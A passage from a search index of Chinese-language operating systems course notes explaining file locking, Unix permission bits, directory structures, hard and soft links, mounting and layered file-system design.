\u4e2d\u627e\u5230\u5bf9\u5e94\u7684\u6761\u76ee\u5e76\u5220\u9664\u8be5\u6761\u76ee\uff0c\u5982\u679c\u5f53\u65f6\u5bf9\u5e94\u7684\u6587\u4ef6\u6ca1\u6709\u5176\u4ed6\u7684\u786c\u94fe\u63a5\uff0c\u5c31\u91ca\u653e\u5668\u7a7a\u95f4\uff0c\u5c31\u50cf\u667a\u80fd\u6307\u9488</li> <li>turncate \u6e05\u7a7a\u6587\u4ef6\u5185\u5bb9\uff0c\u4f46\u4fdd\u7559\u6587\u4ef6\u5c5e\u6027</li> <li> <p>locking \u7531\u6587\u4ef6\u7cfb\u7edf\u63d0\u4f9b\u9501\u670d\u52a1\uff0c\u4f8b\u5982 shared lock \u548c exclusive lock\u3002\u7531\u6b64\u8fd8\u884d\u751f\u51fa\u4e24\u79cd\u673a\u5236</p> </li> <li> <p>Windows \u4f7f\u7528 mandatory lock \u4e00\u65e6\u8fdb\u7a0b\u83b7\u53d6\u4e86\u72ec\u5360\u9501\uff0c\u90a3\u4e48\u64cd\u4f5c\u7cfb\u7edf\u7981\u6b62\u5176\u4ed6\u8fdb\u7a0b\u8bbf\u95ee\u5bf9\u5e94\u6587\u4ef6</p> </li> <li>UNIX \u4f7f\u7528 advistory lock \u8fdb\u7a0b\u53ef\u4ee5\u5f97\u77e5\u9501\u7684\u72b6\u6001\u6765\u81ea\u884c\u51b3\u5b9a\u8981\u4e0d\u8981\u8bbf\u95ee</li> </ul> <p>\u5bf9\u4e8e\u6587\u4ef6\u64cd\u4f5c\u800c\u8a00\uff0c\u53ea\u6709\u6253\u5f00\u4e00\u4e2a\u6587\u4ef6\u9700\u8981\u7528\u5230\u201c\u6587\u4ef6\u540d\u201d\uff0c\u800c\u540e\u7eed\u6240\u6709\u7684\u64cd\u4f5c\uff08\u6b64\u65f6\u6587\u4ef6\u5df2\u7ecf\u5728\u6253\u5f00\u76ee\u5f55\u8868\uff09\u90fd\u53ea\u9700\u8981\u6587\u4ef6\u63cf\u8ff0\u7b26\uff08UNIX\uff09\u6216\u8005\u53eb\u6587\u4ef6\u53e5\u67c4\uff08Windows\uff09</p> <p>\u6587\u4ef6\u540d\uff0c\u4e0d\u5e94\u8be5\u662fopen file list\u7684\u4e00\u90e8\u5206</p> <p>\u800c\u6587\u4ef6\u6253\u5f00\u8fd9\u4e2a\u8fc7\u7a0b\uff0cOS\u5f80\u5f80\u4f1a\u4f7f\u7528\u4e24\u7ea7\u8868\uff0c</p> <ul> <li>\u6574\u4e2a\u7cfb\u7edf\u7684 list</li> <li>\u5355\u4e2a\u8fdb\u7a0b\u7684 list</li> </ul> <p>\u5f53\u6240\u6709\u8fdb\u7a0b\u90fd\u5173\u95ed\u8be5\u6587\u4ef6\u65f6\u624d\u771f\u6b63\u5173\u95ed\u8be5\u6587\u4ef6</p> <p>\u6743\u9650\u4fdd\u62a4</p> <p>\u7406\u60f3\u72b6\u6001\u4e2d\uff0c\u6211\u4eec\u5e94\u8be5\u7ef4\u62a4\u4e00\u4e2a\u8bbf\u95ee\u63a7\u5236\u5217\u8868\uff08access control list\uff09ACL\uff0c\u63cf\u8ff0\u6bcf\u4e2a\u7528\u6237\u5bf9\u6587\u4ef6\u6240\u5177\u6709\u7684\u6743\u9650\u3002</p> <p>\u4f46\u662f\u7ef4\u62a4ACL\u662f\u4e00\u4e2a\u6027\u4ef7\u6bd4\u5f88\u4f4e\u7684\u884c\u4e3a\uff0c\u4f1a\u5bfc\u81f4\u539f\u672c\u56fa\u5b9a\u957f\u5ea6\u7684\u8868\u9879\u53d8\u5f97\u4e0d\u5b9a\u957f\uff0c\u56e0\u4e3a\u7528\u6237\u6570\u91cf\u662f\u4e0d\u786e\u5b9a\u7684</p> <p>\u56e0\u6b64 Unix \u7cfb\u7edf\u4e2d\u4f7f\u7528\u4e86\u8bbf\u95ee\u6743\u9650\u4f4d\uff08access permission bits\uff09\u6765\u5b9e\u73b0\u6743\u9650\u63a7\u5236</p> <p>\u200b\u200b</p> <p>\u7b2c\u4e00\u5217\u5c31\u662f\u6211\u4eec\u7684 access permission bits</p> <p>\u7b2c\u4e00\u4e2a\u5b57\u7b26\u8868\u793a\u6587\u4ef6\u7c7b\u578b\uff0c\u540e9\u4e2a\u5b57\u7b26\u624d\u662f\u6743\u9650\u63a7\u5236\uff0c\u5206\u522b\u8868\u793a\uff0c\u6587\u4ef6\u7684\u6240\u6709\u8005\uff08owner\uff09\uff0c\u6587\u4ef6\u6240\u5c5e\u7ec4\uff08group\uff09\uff0c\u5176\u4ed6\u4eba\uff08other\uff09\u7684\u8bfb\u5199\u6267\u884c\uff08rwx\uff09\u6743\u9650</p> <p>\u200b\u200b</p> <p>\u6587\u4ef6\u7c7b\u578b</p> <ul> <li>\u5bf9\u4e8eOS\u6765\u8bf4\uff0c\u6587\u4ef6\u4e3b\u8981\u5206\u4e3a data \u548c program</li> <li>\u5bf9\u4e8e\u7528\u6237\u6765\u8bf4\uff0c\u6211\u4eec\u4f1a\u8ba4\u4e3a\u540e\u7f00\u540d\u6807\u8bb0\u4e86\u6587\u4ef6\u7c7b\u578b\uff0c\u5176\u5b9e\u540e\u7f00\u540d\u53ea\u662f\u5e2e\u52a9\u7cfb\u7edf\u9009\u62e9\u5408\u9002\u7684\u65b9\u5f0f\u6253\u5f00\u6587\u4ef6\uff0c\u4e0e\u7c7b\u578b\u65e0\u5173</li> <li>unix\u7cfb\u7edf\u4f1a\u5728\u6587\u4ef6\u5f00\u5934\uff0c\u4f7f\u7528\u4e00\u4e32 magic number \u6807\u8bb0\u6587\u4ef6\u7c7b\u578b\uff0c\u4f8b\u5982\u56fe\u7247\u6587\u4ef6\u7684\u5f00\u5934\u901a\u5e38\u662f <code>0xFFD8</code>\u200b\uff0c\u811a\u672c\u6587\u672c\u6587\u4ef6\u5f00\u5934\u4f1a\u4ee5\u7c7b\u4f3c <code>#!bash</code>\u200b \u7684\u5f62\u5f0f\u6765\u6307\u5b9a\u7531\u8c01\u6765\u6267\u884c\uff08\u4f8b\u5982\u8fd9\u4e2a\u662f\u7528 <code>bash</code>\u200b \u6267\u884c\uff09\u3002\u4f46\u5e76\u975e\u6240\u6709\u6587\u4ef6\u90fd\u652f\u6301 magic number \u7684\u6807\u8bb0</li> </ul> <p>\u6587\u4ef6\u7ed3\u6784 * \u6709\u7a7a\u53ef\u4ee5\u518d\u6574\u7406\u4e00\u4e0b</p> <p>\u662f\u6307\u6587\u4ef6\u5b58\u50a8\u6570\u636e\u7684\u7ed3\u6784</p> <ul> <li>\u65e0\u7ed3\u6784\uff1a\u6d41\u5f0f\u5b58\u50a8\u6240\u6709\u7684 words / bytes</li> <li>\u7b80\u5355\u8bb0\u5f55\u7ed3\u6784\uff08simple record structure)\uff1a\u5c06\u6587\u4ef6\u4ee5\u5b9a\u957f/\u4e0d\u5b9a\u957f\u7684 record \u5b58\u50a8\uff0c\u5c31\u6bd4\u5982\u6570\u636e\u5e93\u7ed3\u6784</li> <li>complex structures \u4f8b\u5982 Word \u6587\u6863</li> </ul> <p>\u8fd9\u90e8\u5206\u738b\u9053\u91cc\u5199\u7684\u5f88\u8be6\u7ec6\uff0c\u8fd8\u6709\u7d22\u5f15\u6587\u4ef6\uff0c\u7d22\u5f15\u987a\u5e8f\u6587\u4ef6\u7b49\u7b49\u5185\u5bb9 \u738b\u9053P257</p>"},{"location":"ZJU-course/OS/%E6%96%87%E4%BB%B6%E7%B3%BB%E7%BB%9F/#62","title":"6.2 \u8bbf\u95ee\u65b9\u5f0f","text":"<p>\u8fd9\u90e8\u5206\u8fd8\u4e0d\u591f\u8be6\u7ec6</p> <p>\u6709\u4ee5\u4e0b\u51e0\u79cd\u5b58\u53d6\u65b9\u5f0f</p> <ul> <li>\u987a\u5e8f\u8bbf\u95ee sequential access</li> <li>\u76f4\u63a5\u8bbf\u95ee / \u76f8\u5bf9\u8bbf\u95ee / \u968f\u673a\u8bbf\u95ee \u652f\u6301\u4ee5\u76f8\u540c\u7684\u65f6\u95f4\u8bbf\u95ee\u4efb\u610f\u4f4d\u7f6e</li> <li>\u7d22\u5f15\u987a\u5e8f\u8bbf\u95ee indexed sequential-access \u53ef\u80fd\u8fd8\u63d0\u4f9b\u4e86\u7d22\u5f15\uff0c\u53ef\u4ee5\u501f\u6b64\u8bbf\u95ee</li> </ul>"},{"location":"ZJU-course/OS/%E6%96%87%E4%BB%B6%E7%B3%BB%E7%BB%9F/#63","title":"6.3 \u76ee\u5f55\u7ed3\u6784","text":"<p>\u6587\u4ef6\u76ee\u5f55\u7684\u672c\u8d28\u5c31\u662f\u6587\u4ef6\u63a7\u5236\u5757\uff08FCB\uff09\u7684\u6709\u5e8f\u96c6\u5408\u3002</p> <p>\u4f46\u662f\u5728UNIX\u7cfb\u7edf\u4e2d\uff0c\u91c7\u53d6\u4e86\u76ee\u5f55\u548c\u6587\u4ef6\u63cf\u8ff0\u5206\u79bb\u7684\u65b9\u6cd5\uff0c\u5c06FCB\u62c6\u6210\u4e00\u4e2a\u72ec\u7acb\u7684Inode\uff0c\u800c\u76ee\u5f55\u4ec5\u4fdd\u5b58\u6587\u4ef6\u540d\u548cInode\u53f7\uff0c\u53ef\u4ee5\u6709\u6548\u964d\u4f4e\u76ee\u5f55\u7684\u5927\u5c0f\u4ee5\u53ca\u63d0\u9ad8\u641c\u7d22\u6548\u7387\uff08\u78c1\u76d8\u8bfb\u53d6\u7684\u6b21\u6570\u5c11\u4e86\uff09</p> <p>\u5728Linux\u4e2d\uff0c\u76ee\u5f55\u672c\u8d28\u4e0a\u662f\u4e00\u4e2a\u7279\u6b8a\u7684\u6587\u4ef6\uff0c\u76ee\u5f55\u4e0b\u7684\u6587\u4ef6\u7684\u5143\u6570\u636e\u5b58\u50a8\u5728\u76ee\u5f55\u4e0a\u3002\u76ee\u5f55\u7684\u7ed3\u6784\u5c31\u8868\u793a\u4e86\u76ee\u5f55\u4e0b\u6587\u4ef6\u7684\u7ec4\u7ec7\u65b9\u5f0f\u3002</p> <p>\u76ee\u5f55\u5b9e\u73b0\u4e86 filename \u5230 FCB \u7684\u6620\u5c04</p> <p>\u5355\u7ea7\u76ee\u5f55 single-level directory</p> <p>\u6240\u6709\u7684\u6587\u4ef6\u88ab\u5e73\u94fa\u5728\u6839\u76ee\u5f55\u4e0b</p> <p>\u200b\u200b</p> <p>\u6709\u4ee5\u4e0b\u7f3a\u70b9</p> <ul> <li>\u4e3a\u4e86\u5b9e\u73b0\u7d22\u5f15\uff0c\u6587\u4ef6\u540d\u5b57\u5fc5\u987b\u662f\u552f\u4e00</li> <li>\u6587\u4ef6\u6570\u91cf\u589e\u5927\u4e4b\u540e\u8fd9\u4e2a\u8bbe\u8ba1\u4f1a\u53d8\u5f97\u4e0d\u5408\u7406\uff0c\u4e0d\u652f\u6301\u5206\u7ec4</li> </ul> <p>\u4e8c\u7ea7\u76ee\u5f55 Two-level directory</p> <p>\u6309\u7167\u7528\u6237\u4e3a\u4f9d\u636e\uff0c\u5f62\u6210\u4e8c\u7ea7\u76ee\u5f55\uff0c\u4e3b\u6587\u4ef6\u76ee\u5f55\uff08master file directory, MFD\uff09 \u4e0b\u4e3a\u6bcf\u4e2a\u7528\u6237\u5206\u914d\u4e00\u4e2a\u7528\u6237\u6587\u4ef6\u76ee\u5f55\uff08user file directory\uff0cUFD\uff09</p> <p>\u200b\u200b</p> <p>\u7531\u4e8e\u51fa\u73b0\u4e86\u5206\u5c42\u7ed3\u6784\uff0c\u5bf9\u6587\u4ef6\u7684\u7d22\u5f15\u4ece\u6587\u4ef6\u540d\u53d8\u6210\u4e86\u6587\u4ef6\u8def\u5f84</p> <p>\u6811\u5f62\u76ee\u5f55 tree-structured directories</p> <p>\u5c06\u76ee\u5f55\u672c\u8eab\u89c6\u4e3a\u4e00\u4e2a\u7279\u6b8a\u6587\u4ef6\uff0c\u4f7f\u5176\u901a\u7528\u5316\uff0c\u4f7f\u5f97\u7528\u6237\u53ef\u4ee5\u81ea\u7531\u521b\u5efa\u76ee\u5f55\u8fdb\u884c\u5206\u7ec4</p> <p>\u200b\u200b</p> <p>\u6709\u4ee5\u4e0b\u7279\u6027</p> <ul> <li>\u975e\u76ee\u5f55\u8282\u70b9\u90fd\u662f\u53f6\u5b50\u8282\u70b9</li> <li>\u76ee\u5f55\u8282\u70b9\u90fd\u662f\u975e\u53f6\u5b50\u8282\u70b9\uff08\u4e0d\u8003\u8651\u7a7a\u76ee\u5f55\uff09</li> </ul> <p>\u5728\u8fd9\u4e2a\u7ed3\u6784\u4e2d\u8fdb\u884c\u6587\u4ef6\u7d22\u5f15\uff0c\u9700\u8981\u63d0\u4f9b\u6587\u4ef6\u7684\u8def\u5f84\uff0c\u6709\u7edd\u5bf9\u548c\u76f8\u5bf9\u4e24\u79cd\uff0c\u6bcf\u4e2a\u8fdb\u7a0b\u90fd\u6709\u4e00\u4e2acurrent directory\uff0c\u4f7f\u7528\u5f53\u524d\u76ee\u5f55\u5c31\u662f\u76f8\u5bf9\u8def\u5f84</p> <ul> <li>absolute path</li> <li>relative path</li> </ul> <p>\u6b64\u65f6\u624d\u89e3\u51b3\u4e86\u81ea\u7531\u5206\u7ec4\u7684\u95ee\u9898\uff0c\u4f7f\u5f97\u6587\u4ef6\u7cfb\u7edf\u7684\u7ed3\u6784\u5316\u7ba1\u7406\u80fd\u529b\u5927\u5927\u589e\u5f3a</p> <p>\u5220\u9664\u76ee\u5f55\u65f6\uff0c\u6709\u4e24\u79cd\u8bbe\u8ba1</p> <ul> <li>\u4e0d\u5141\u8bb8\u5220\u9664\u975e\u7a7a\u76ee\u5f55</li> <li>\u5220\u9664\u76ee\u5f55\u4e0b\u6240\u6709\u6587\u4ef6</li> </ul> <p>\u65e0\u73af\u56fe\u76ee\u5f55 acyclic-graph directories</p> <p>\u5728\u6811\u5f62\u7684\u7ed3\u6784\u7684\u57fa\u7840\u4e0a\uff0c\u5141\u8bb8\u76ee\u5f55\u4e4b\u95f4\u5b58\u5728\u94fe\u63a5\u5173\u7cfb\uff0c\u8fd9\u79cd\u5173\u7cfb\u652f\u6301\u5171\u4eab</p> <p>\u200b\u200b</p> <p>\u94fe\u63a5\u5173\u7cfb\u5b58\u5728\u4e24\u79cd</p> <ul> <li>soft link\uff0c\u53c8\u79f0\u4e3a symbolic link \u662f\u4e00\u4e2a\u6307\u5411\u6587\u4ef6\u7684\u6307\u9488\uff0c\u7c7b\u4f3c\u4e0e\u5feb\u6377\u65b9\u5f0f\u3002\u5220\u9664\u6587\u4ef6\u7684\u65f6\u5019\u4e0d\u4f1a\u987a\u5e26\u5904\u7406 soft link\uff0c\u4f46\u662f\u5176\u5df2\u7ecf\u5931\u6548\u4e86\uff0c\u5f53\u7528\u6237\u8bd5\u56fe\u8bbf\u95ee\u7684\u65f6\u5019\u4f1a\u8868\u793a\u51fa\u6587\u4ef6\u5df2\u7ecf\u5220\u9664\uff0c\u5c31\u76f8\u5f53\u4e8e\u4e00\u4e2a\u8f7b\u91cf\u7684\u7279\u6b8a\u6587\u4ef6</li> <li> <p>hard link\uff0c\u590d\u5236\u94fe\u63a5\u6587\u4ef6\u76ee\u5f55\u9879\u7684\u6240\u6709\u5143\u6570\u636e\uff0c\u5b58\u50a8\u5230\u76ee\u6807\u76ee\u5f55\u4e2d\uff0c\u6b64\u65f6\u6587\u4ef6\u5e73\u7b49\u5730\u5c5e\u4e8e\u4e24\u4e2a\u76ee\u5f55\uff0c\u662f\u771f\u6b63\u7684\u6307\u9488\u62f7\u8d1d\uff0chard link \u662f\u76ee\u5f55\u8868\u9879</p> </li> <li> <p>\u5f53\u6587\u4ef6\u5143\u4fe1\u606f\u66f4\u65b0\u7684\u65f6\u5019\uff0c\u9700\u8981\u4fdd\u8bc1\u5176\u5404\u4e2ahard link\u4e5f\u540c\u6b65\u66f4\u65b0</p> </li> <li>\u5f53\u8be5\u6587\u4ef6\u6709\u786c\u94fe\u63a5\u5b58\u5728\u7684\u65f6\u5019\uff0c\u5176\u88ab\u5220\u9664\u65f6\u4e0d\u4f1a\u771f\u6b63\u88ab\u5220\u9664\uff0c\u800c\u662f\u5220\u9664\u4e86\u5bf9\u5e94\u6307\u9488+\u540c\u6b65\u66f4\u65b0\u5143\u6570\u636e\uff0c\u76f4\u5230\u5176 reference number \u53d8\u4e3a\u4e860\uff0c\u6587\u4ef6\u624d\u4f1a\u88ab\u5220\u9664</li> </ul> <p>UNIX\u540c\u65f6\u652f\u6301\u4e0a\u8ff0\u4e24\u79cd\u94fe\u63a5</p> <p>\u8fd9\u79cd\u7c7b\u578b\u7684\u76ee\u5f55\u7ed3\u6784\u5b58\u5728\u4ee5\u4e0b\u7279\u70b9</p> <ul> <li>\u4e3a\u4e86\u4fdd\u8bc1\u65e0\u73af\uff0c\u6211\u4eec\u53ea\u5141\u8bb8\u521b\u5efa\u5173\u4e8e\u6587\u4ef6\u8fd9\u79cd\u53f6\u5b50\u8282\u70b9\u7684\u786c\u94fe\u63a5\uff0c\u800c\u4e0d\u5141\u8bb8\u521b\u5efa\u76ee\u5f55\u7684\u786c\u94fe\u63a5\uff0c\u4f46\u662f\u5176\u4f1a\u521b\u5efa\u5bf9 <code>.</code>\u200b \u548c <code>..</code>\u200b \u7684\u786c\u94fe\u63a5</li> <li>\u786c\u94fe\u63a5\u672c\u8d28\u662f\u8868\u9879\uff0c\u5176\u4e0e\u6587\u4ef6\u7cfb\u7edf\u76f8\u5173\uff0c\u6240\u4ee5\u786c\u94fe\u63a5\u53ea\u80fd\u5728\u540c\u4e00\u6587\u4ef6\u7cfb\u7edf\u4e0b\u521b\u5efa\uff0c\u4e0d\u80fd\u8de8\u8fc7 file-system boundary</li> </ul> <p>\u901a\u7528\u56fe\u76ee\u5f55</p> <p>\u672c\u8d28\u4e0a\u548c\u65e0\u73af\u56fe\u76ee\u5f55\u76f8\u540c\uff0c\u533a\u522b\u5728\u4e8e\u5176\u907f\u514d\u6b7b\u5faa\u73af\u7684\u673a\u5236\u4e0d\u540c\uff0c\u5141\u8bb8\u76ee\u5f55\u5b58\u5728\u73af\uff0c\u4f46\u5728\u64cd\u4f5c\u65f6\u901a\u8fc7\u7b97\u6cd5\u6765\u907f\u514d\u51fa\u73b0\u95ee\u9898\uff0c\u4f8b\u5982\u56fe\u5904\u7406\u7b97\u6cd5\u548c\u5783\u573e\u56de\u6536\u673a\u5236\u7b49\u7b49</p> <p>\u901a\u8fc7\u7c7b\u4f3c\u4e8e garbage collection \u7684\u7b97\u6cd5\u53ef\u4ee5\u786e\u5b9a\u54ea\u4e9b\u6587\u4ef6\u53ef\u4ee5\u5220\u9664\uff0c\u4f46\u662f\u4f1a\u6bd4\u8f83\u8d39\u65f6</p> <p>\u200b\u200b</p>"},{"location":"ZJU-course/OS/%E6%96%87%E4%BB%B6%E7%B3%BB%E7%BB%9F/#64","title":"6.4 \u6587\u4ef6\u7cfb\u7edf","text":"<p>\u6587\u4ef6\u7cfb\u7edf file system \u5b58\u50a8\u5728\u4e8c\u7ea7\u5b58\u50a8\u4e0a\uff0c\u4e3aOS\u63d0\u4f9b\u5feb\u901f\uff0c\u4fbf\u6377\u7684\u5bf9\u78c1\u76d8\u6570\u636e\u7684\u64cd\u4f5c\u3002</p> <p>\u6587\u4ef6\u7cfb\u7edf\u662fOS\u4e2d\uff0c\u4ee5\u6587\u4ef6\u7684\u65b9\u5f0f\u7ba1\u7406\u8ba1\u7b97\u673a\u8f6f\u4ef6\u8d44\u6e90\u7684\u8f6f\u4ef6\uff0c\u4ee5\u53ca\u88ab\u7ba1\u7406\u7684\u6587\u4ef6\u548c\u6570\u636e\u7ed3\u6784\u7684\u96c6\u5408</p> <p>\u73b0\u5728\u7684OS\u90fd\u652f\u6301\u591a\u79cd\u6587\u4ef6\u7cfb\u7edf</p> <ul> <li>Unix \u4f7f\u7528 Unix FS (UFS)\uff0c\u5b83\u57fa\u4e8e BFFS (Berkeley Fast FS)\uff1b</li> <li>Windows \u652f\u6301 File Allocation Table(FAT), FAT32 \u548c Windows NT File System (NTFS)\uff1b</li> <li>Linux \u7684\u6807\u51c6\u6587\u4ef6\u7cfb\u7edf\u662f extended file system\uff0c\u6700\u5e38\u89c1\u7684\u662f ext3 \u548c ext4\u3002\u4e0d\u8fc7 Linux \u652f\u6301 40+ \u79cd FS\u3002</li> </ul> <p>\u6302\u8f7d mount</p> <p>\u6302\u8f7d\u662f\u6307\u5c06\u4e00\u4e2a\u6587\u4ef6\u7cfb\u7edf\u7684\u6839\u76ee\u5f55\u6302\u8f7d\u5230\u53e6\u4e00\u4e2a\u6587\u4ef6\u7cfb\u7edf\u7684\u67d0\u4e2a\u76ee\u5f55\u4e2d\uff08\u8be5\u76ee\u5f55\u79f0\u4e3amount point\uff09\u3002\u8fd9\u4f7f\u5f97\u8be5\u76ee\u5f55\u4e0b\u7684\u6587\u4ef6\u53ef\u4ee5\u8bbf\u95ee\u5230\u88ab\u6302\u5728\u7684\u6587\u4ef6\u7cfb\u7edf\u4e2d\u7684\u6587\u4ef6\u3002</p> <p>\u53ea\u6709\u88ab\u6302\u8f7d\u4e86\uff0c\u4e00\u4e2a\u6587\u4ef6\u7cfb\u7edf\u624d\u80fd\u88ab\u8bbf\u95ee</p> <p>\u200b\u200b</p> <p>\u6587\u4ef6\u7cfb\u7edf\u5206\u5c42\u8bbe\u8ba1</p> <p>\u6587\u4ef6\u7cfb\u7edf\u88ab\u5206\u4e3a\u591a\u5c42\u7684\u6a21\u5757\uff0c\u5411\u4e0a\u4e0e Application Programs \u8bf7\u6c42\u4ea4\u4e92\uff0c\u5411\u4e0b\u4e0e device \u4ea4\u4e92</p> <p>\u200b\u200b</p> <ul> <li> <p>I/O control</p> </li> <li> <p>\u5411\u4e0b\u63a7\u5236 IO devices \u5411\u4e0a\u4e3a\u6587\u4ef6\u7cfb\u7edf\u63d0\u4f9b\u5bf9\u5176\u7684IO\u529f\u80fd</p> </li> <li> <p>\u5305\u542b device drivers \u548c interrupt handler \u4e0e\u5177\u4f53\u7684device\u8fdb\u884c\u4ea4\u4e92\uff0c\u540c\u65f6\u5411\u4e0a\u5c42\u5c4f\u853d\u76f8\u5e94\u7684\u7279\u5f81</p> <ul> <li>device drivers\u4e3a\u4e0a\u5c42\u63d0\u4f9b\u4e86\u4e00\u5957\u7edf\u4e00\u7684\u63a5\u53e3\uff0c\u5f80\u5f80\u662f\u4e00\u7cfb\u5217\u5f02\u6b65\u4e2d\u65ad\u5904\u7406\u65b9\u6848</li> <li>Basic file system</li> </ul> </li> <li> <p>\u5411\u4e0b\u53d1\u51fa\u62bd\u8c61\u7684\u64cd\u4f5c\u6307\u4ee4\uff0c\u4f8b\u5982\u8bfb\u548c\u5199</p> </li> <li>\u4e0eIO\u8c03\u5ea6\u76f8\u5173</li> <li> <p>\u7ba1\u7406 memory buffer \u548c caches</p> <ul> <li>buffer \u7684\u4f5c\u7528\u5728\u4e8e\u4f18\u5316\u5916\u90e8\u6392\u5e8f</li> <li>cache \u4f1a\u7528\u6765\u5b58\u50a8\u4e00\u4e9b\u9891\u7e41\u7528\u5230\u7684\u6587\u4ef6\u7cfb\u7edf\u5143\u6570\u636e\uff0c\u4ee5\u63d0\u9ad8\u6587\u4ef6\u7cfb\u7edf\u6027\u80fd\uff0c\u7ba1\u7406file system, directory \u548c data block\u7684\u7f13\u5b58</li> <li>File-organization module</li> </ul> </li> <li> <p>\u4ee5 basic file system \u7684\u529f\u80fd\u4e3a\u57fa\u7840</p> </li> <li>\u5b9e\u73b0\u4e86 file \u7684 logical block \u5230 physical address \u7684\u6620\u5c04</li> <li> <p>\u5305\u62ec\u4e86 free-space manager </p> <ul> <li>\u7ef4\u62a4\u4e86\u90a3\u4e9b\u6ca1\u88ab\u5206\u914d\u7684blocks\uff0c\u5e76\u5728file-organization module \u8bf7\u6c42\u7684\u65f6\u5019\u63d0\u4f9b\u8fd9\u4e9bblocks</li> <li>Logical file system</li> </ul> </li> <li> <p>\u5b58\u50a8\u6587\u4ef6\u7cfb\u7edf\u7684\u7ed3\u6784\u4fe1\u606f\uff0c\u4e0d\u5305\u62ec\u5b9e\u9645\u7684\u6587\u4ef6\u5185\u5bb9\u4fe1\u606f\uff0c\u7ba1\u7406\u6240\u6709\u7684metadata\uff0c\u5176\u5b9e\u5c31\u662f\u7ba1\u7406\u76ee\u5f55\u548cFCB</p> </li> <li>\u5176\u4f1a\u7ef4\u62a4 directory \u7684\u4fe1\u606f\uff0c\u4e3afile organization module \u63d0\u4f9b\u4e00\u4e9b\u4fe1\u606f\uff0c\u4f8b\u5982\u7b26\u53f7\u6587\u4ef6\u540d</li> <li>FCB\uff08file control block\uff09 \u4f1a\u7ef4\u62a4\u88ab\u6253\u5f00\u7684\u6587\u4ef6\u7684\u4e00\u4e9b\u5177\u4f53\u4fe1\u606f</li> <li>\u5c06\u8bfb\u5199 \u201c\u6587\u4ef6\u540d\u201d \u7684\u6307\u4ee4\u8f6c\u6362\u6210 \u8bfb\u5199 \u201clogical block\u201d</li> <li>Application program: \u53d1\u51fa read / write / open \u67d0\u4e2a file path \u7684\u6307\u4ee4\uff0c\u4f20\u9012\u7ed9\u4e0b\u4e00\u5c42</li> </ul> <p>\u5206\u5c42\u7684\u8bbe\u8ba1\u53ef\u4ee5\u964d\u4f4e\u6587\u4ef6\u7cfb\u7edf\u672c\u8eab\u7684\u590d\u6742\u6027\u548c\u5197\u4f59\u6027\uff0c\u4f46\u662f\u53ef\u80fd\u4e00\u5b9a\u7a0b\u5ea6\u4e0a\u5f71\u54cd\u6027\u80fd</p>"},{"location":"ZJU-course/OS/%E6%96%87%E4%BB%B6%E7%B3%BB%E7%BB%9F/#65","title":"6.5 \u6587\u4ef6\u7cfb\u7edf\u7684\u5b9e\u73b0 *","text":"<p>\u4e3a\u4e86\u5b9e\u73b0\u6587\u4ef6\u7cfb\u7edf\uff0c\u6211\u4eec\u9700\u8981\u5728\u786c\u76d8\u548c\u5185\u5b58\u4e2d\u7ef4\u62a4\u4e00\u4e9b\u6570\u636e\u7ed3\u6784</p> <p>\u786c\u76d8\u6570\u636e\u7ed3\u6784 on-disk structures</p> <ul> <li> <p>Boot control block</p> </li> <li> <p>per volume \u6bcf\u4e2a\u5377\u6709\u4e00\u4e2a\u8fd9\u6837\u7684\u7ed3\u6784\uff0c\u524d\u63d0\u662f\u8fd9\u4e2a volume \u662f boot parition</p> </li> <li>\u64cd\u4f5c\u7cfb\u7edf\u88ab\u4fdd\u5b58\u5728\u5f15\u5bfc\u63a7\u5236\u5757 Boot control block \u4e2d\uff0c\u662f\u64cd\u4f5c\u7cfb\u7edf\u6240\u5728Volume\u7684\u7b2c\u4e00\u4e2ablock</li> <li>\u8fd9\u91cc\u5b58\u50a8 \u5f15\u5bfc OS \u9700\u8981\u7684\u4fe1\u606f</li> <li>\u5728 UFS \u4e2d\uff0cboot control block \u4e5f\u88ab\u79f0\u4e3a boot block\uff1b\u5728 NTFS \u4e2d\uff0c\u4e5f\u88ab\u79f0\u4e3a partition boot sector\u3002</li> <li> <p>Volume control block</p> </li> <li> <p>per volume</p> </li> <li>\u5377\u63a7\u5236\u5757 Volume control block \u7ef4\u62a4\u4e86volume\u4e2d\u7684\u5177\u4f53\u4fe1\u606f\uff0c\u4f8b\u5982\u5176\u4e2d\u7684blocks\u6570\u91cf\uff0c\u7a7a\u95f2block\u6570\u91cf\u548c\u6307\u9488\uff0c\u7a7a\u95f2PCB\u6570\u91cf\u548c\u6307\u9488</li> <li>\u5728 UFS volume control block \u4e5f\u88ab\u79f0\u4e3a superblock\uff1b\u5728 NTFS \u4e2d\uff0c\u4e5f\u88ab\u79f0\u4e3a master file table</li> <li> <p>Directory structure</p> </li> <li> <p>per FS \u6bcf\u4e2a\u6587\u4ef6\u7cfb\u7edf\u6709\u4e00\u4e2a</p> </li> <li>\u76ee\u5f55\u7ed3\u6784 Directory structure \u7528\u6765\u7ec4\u7ec7files\uff0c\u540c\u65f6\u7ef4\u62a4files\u7684\u5143\u4fe1\u606f</li> <li>\u5728 UFS \u4e2d\uff0c\u5b83\u7ef4\u62a4\u4e86\u6587\u4ef6\u4ee5\u53ca\u5bf9\u5e94\u7684 inode numbers\uff1b\u5728 NTFS \u4e2d\uff0c\u5b83\u5728 master file table \u4e2d\u88ab\u7ef4\u62a4\u3002</li> <li> <p>File control block</p> </li> <li> <p>\u6587\u4ef6\u63a7\u5236\u5757\uff08file control block FCB) \u7ef4\u62a4\u4e86\u88ab\u6253\u5f00\u7684\u6587\u4ef6\u7684\u5177\u4f53\u4fe1\u606f\uff0cPCB\u4e00\u822c\u6709\u4e00\u4e2a\u552f\u4e00\u7684\u6807\u8bc6\u7b26\u4e0e\u76ee\u5f55\u9879\u76f8\u5173\u8054</p> </li> <li>\u4e00\u822c\u5305\u542b \u6587\u4ef6\u6743\u9650\uff0c\u6587\u4ef6\u64cd\u4f5c\u65e5\u671f\uff0csize\uff0c\u4f4d\u7f6e\u7b49\u7b49</li> <li>\u5728 UFS \u4e2d\uff0cFCB \u6307\u7684\u5c31\u662f\u4e00\u4e2a inode\uff1b\u5728 NTFS \u4e2d\uff0cPCB \u901a\u5e38\u5728 master file table \u4e2d\u88ab\u7ef4\u62a4\uff0c\u5176\u7ef4\u62a4\u5f62\u5f0f\u7c7b\u4f3c\u4e8e\u5173\u7cfb\u5f62\u6570\u636e\u5e93\u3002</li> <li>\u200b\u200b</li> </ul> <p>\u5185\u5b58\u6570\u636e\u7ed3\u6784 In-memory structures</p> <ul> <li> <p>Mount table</p> </li> <li> <p>\u88ab\u6302\u5728\u7684volume\u4f1a\u88ab\u8bb0\u5f55\u5728mount table\u4e2d</p> </li> <li> <p>Directory cache</p> </li> 